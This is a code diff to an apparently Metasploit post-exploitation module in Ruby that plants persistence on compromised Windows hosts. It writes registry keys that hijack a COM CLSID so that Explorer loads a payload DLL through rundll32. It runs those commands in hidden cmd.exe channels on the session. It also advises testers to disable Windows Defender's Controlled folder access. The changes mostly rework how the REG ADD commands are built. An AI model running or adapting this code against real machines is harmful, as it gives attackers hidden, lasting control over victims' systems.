@@ -198,7 +198,6 @@ def run
       print_line("windows 10 version its protected againts this exploit.")
       print_line("-------------------------------------------------------")
       print_line("Disable 'Controlled folder access' in Windows Defender")
-      print_line("And disable also UAC from running (set never notify)")
       print_line("If you wish to teste this on windows 10 version distros")
       print_line("-------------------------------------------------------")
       Rex::sleep(7.0)
@@ -282,26 +281,24 @@ def run
         # List of registry keys to add to target regedit .. (rundll32.exe payload.dll,main)
         #
         if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
-          print_status("Persistance mode sellected")
+          print_warning("Persistance mode sellected")
           dll_exe = "rundll32 #{app_path},main"
           Rex::sleep(1.0)
           hacks = [
-            "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe} /f",
-            "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f",
-            "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment /f",
-            "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder Attributes /t REG_DWORD /d 0xf090013d /f",
-            "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder HideOnDesktop /t REG_SZ /d /f",
-            "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
+            "#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe}",
+            "#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d",
+            "#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment",
+            "#{hive_key}\\#{new_GUID}\\ShellFolder Attributes /t REG_DWORD /d 0xf090013d",
+            "#{hive_key}\\#{new_GUID}\\ShellFolder HideOnDesktop /t REG_SZ /d"
           ]
         else
           #
           # DEMO mode (user inputs)
           #
-          print_status("Demonstration mode sellected")
+          print_good("Demonstration mode sellected")
           Rex::sleep(1.0)
             hacks = [
-              "REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d #{app_path} /f",
-              "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
+              "#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d #{app_path} /f"
             ]
         end
 
@@ -313,7 +310,7 @@ def run
          hacks.each do |cmd|
             begin
               # execute cmd prompt in a hidden channelized windows
-              r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+              r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd} /f", nil, {'Hidden' => true, 'Channelized' => true})
               print_line("    Hijack: #{cmd}")
  
                 # close client channel when done
@@ -354,9 +351,9 @@ def run
      #
      print_status("Writing cleaner resource file ..")
      Rex::sleep(1.0)
-       rand = Rex::Text.rand_text_alpha(8)
+       rand = Rex::Text.rand_text_alpha(4)
        loot_folder = datastore['LOOT_FOLDER']
-       File.open("#{loot_folder}/#{rand}.rc", "w") do |f|
+       File.open("#{loot_folder}/Clean_#{rand}.rc", "w") do |f|
        f.write("reg deletekey -k HKCU\\\\Software\\\\Classes\\\\CLSID\\\\#{new_GUID}")
        f.close
      end
